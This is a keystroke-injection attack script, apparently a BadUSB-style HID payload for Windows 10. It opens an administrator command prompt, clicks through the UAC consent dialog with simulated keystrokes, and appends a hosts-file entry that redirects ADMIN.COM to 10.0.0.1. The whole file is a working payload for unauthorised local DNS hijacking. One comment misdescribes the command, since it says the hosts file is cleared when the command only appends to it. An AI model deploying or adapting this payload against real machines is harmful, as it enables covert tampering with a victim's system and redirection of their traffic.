layout('es')                    // Spanish keyboard layout
typingSpeed(100,150)    // Wait 100ms between key strokes + an additional random value between 0ms and 150ms (natural)

// Author:ernest and isaac
// This script has been designed to be ran in a Windows 1o desktop.

// Open the run box
press("GUI r")
delay(100)
type("cmd.exe")
delay(100)
// Run CMD as administrator
press("CONTROL SHIFT ENTER")
delay(100)
// Press twice the combination of keys GUI+TAB in order to select the window that allows us to connect as administrator
press("GUI TAB")
delay(100)
press("GUI TAB")
delay(100)
// Press the right arrow so that it is sure that we are in the "part" where you can accept or decline
press("RIGHT_ARROW")
delay(100)
// Press left arrow to accept connecting as root
press("LEFT_ARROW")
delay(100)
press("ENTER")
delay(100)
// Clears all the text in the hosts file from windows
type("ECHO. >> C:\WINDOWS\SYSTEM32\DRIVERS\ETC\HOSTS")
delay(100)
press("ENTER")
type("ECHO 10.0.0.1 ADMIN.COM >> C:\WINDOWS\SYSTEM32\DRIVERS\ETC\HOSTS")
delay(100)
press("ENTER")
delay(100)
type("exit")
delay(100)
press("ENTER")
